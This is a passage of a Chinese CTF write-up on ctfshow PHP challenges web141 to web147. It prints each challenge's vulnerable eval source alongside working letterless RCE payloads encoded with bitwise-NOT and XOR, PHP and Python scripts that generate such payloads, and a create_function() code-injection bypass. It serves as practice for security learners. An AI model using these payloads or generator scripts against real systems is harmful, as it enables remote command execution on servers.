class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (String)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (String)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, $v3))&#123;</span><br><span class="line">            $code =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3$v2;&quot;</span>);</span><br><span class="line">            echo <span class="string">&quot;$v1$v3$v2 = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正则匹配：</p><table><thead><tr><th>\w</th><th>匹配字母、数字、下划线。等价于’[A-Za-z0-9_]’。</th></tr></thead><tbody><tr><td>\W</td><td>匹配非字母、数字、下划线。等价于 ‘[^A-Za-z0-9_]’。</td></tr></tbody></table><p>无字母RCE return会中断当前字符串的解释<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688294024926-7575f212-3ec4-4547-84d0-99c516f558d8.png" alt="cf7706bc99c449489a6f212f5fff9313.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;phpinfo();return 1;&quot;</span>);</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;return 1;phpinfo();&quot;</span>)</span><br></pre></td></tr></table></figure><p>第一句会执行phpinfo()，但是第二句不行，因为return后就中止了。<br>随意eval(“return phpinfo();”)这样可以执行，但是因为有v1和v2所以没法构造成这样。<br>但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。<br>这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1&amp;v2=1&amp;v3=-phpinfo()-<br>现在我们的任务就是取构造命令，那我们就用个简单的方式取反来试一下。<br>运行脚本构造system(‘tac f*’)得到 (<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)<br>同理，-可以替换为+-*/ |^<br>payload：<code>?v1=1&amp;v2=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-</code></p><h2 id="PS取反脚本等无字母"><a href="#PS取反脚本等无字母" class="headerlink" title="PS取反脚本等无字母"></a>PS取反脚本等无字母</h2><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p></blockquote><p>取反：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1))&#123;</span><br><span class="line">        $d = (<span class="built_in">int</span>)($v1 * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep($d);</span><br><span class="line">        echo file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接传0即可<br><code>?v1=0</code>或者<code>?v1=0x0</code></p><h1 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h1><h3 id="考点：异或脚本-return-v1-v2-v3"><a href="#考点：异或脚本-return-v1-v2-v3" class="headerlink" title="考点：异或脚本 return$v1$v2$v3"></a>考点：异或脚本 return$v1$v2$v3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (String)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (String)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                die(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3$v2;&quot;</span>);</span><br><span class="line">            echo <span class="string">&quot;$v1$v3$v2 = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据过滤字符使用异或脚本，使用php生成字典，使用python生成payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">r&quot;D:\CodeWorkSpace\php\xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                <span class="comment"># print(i)</span></span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>)) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><p>payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%00%0b%01%03%00%06%00&quot;^&quot;%20%7f%60%60%20%60%2a&quot;)*</code></p><h1 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h1><h3 id="考点：无字母RCE"><a href="#考点：无字母RCE" class="headerlink" title="考点：无字母RCE"></a>考点：无字母RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">  <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">  <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">      <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>check了v3没有checkv2，将指令传入v2即可。<br>改一下上一题的payload就行：<code>?v1=1&amp;v2=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%00%0b%01%03%00%06%00&quot;^&quot;%20%7f%60%60%20%60%2a&quot;);&amp;v3=1</code></p><h1 id="web145-1"><a href="#web145-1" class="headerlink" title="web145"></a>web145</h1><h3 id="考点：无字母RCE-1"><a href="#考点：无字母RCE-1" class="headerlink" title="考点：无字母RCE"></a>考点：无字母RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了+-*/^，但是没有过滤｜~<br>payload<code>?v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|</code><br>或者使用三元运算符：<br><code>GET:?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</code></p><h1 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?v1=1&amp;v2=1&amp;v3=|(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)|</code><br>还可以：<code>GET:?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</code></p><h1 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h1><h3 id="考点：正则-create-function-代码注入-绕过正则检测"><a href="#考点：正则-create-function-代码注入-绕过正则检测" class="headerlink" title="考点：正则 create_function()代码注入 \绕过正则检测"></a>考点：正则 create_function()代码注入 \绕过正则检测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、修正符:D 如果使用$限制结尾字符,则不允许结尾有换行;<br>不能出现以下划线、数字、大小写字母开头并结尾的字符串。很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。<br>2、考察点：create_function()代码注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">类似于</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">如果我们第二个参数输入的是<span class="string">&#x27;echo 111;&#125;phpinfo();//&#x27;</span></span><br><span class="line">即可把前面的方法括号给闭合并且成功执行phpinfo命令，后面用<span class="comment">//注释掉后边的语句</span></span><br><span class="line">也就是下面这个结构</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">111</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//;&#125;</span></span><br><span class="line"> </span><br><span class="line">也就是</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//;&#125;</span></span><br></pre></td></tr></table></figure><p>fuzz发现，只有<code>\</code>能够绕过正则检测。原因如下：<br>%5c即 \ 可以绕过正则表达式，正好\在php里代表默认命名空间，具体原理可以看下<a href="https://paper.seebug.org/755/">这篇文章</a>，这样我们就可以执行任意命令了<br>参考dotast师傅对\的解释：<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径即在当前的空间内调用； 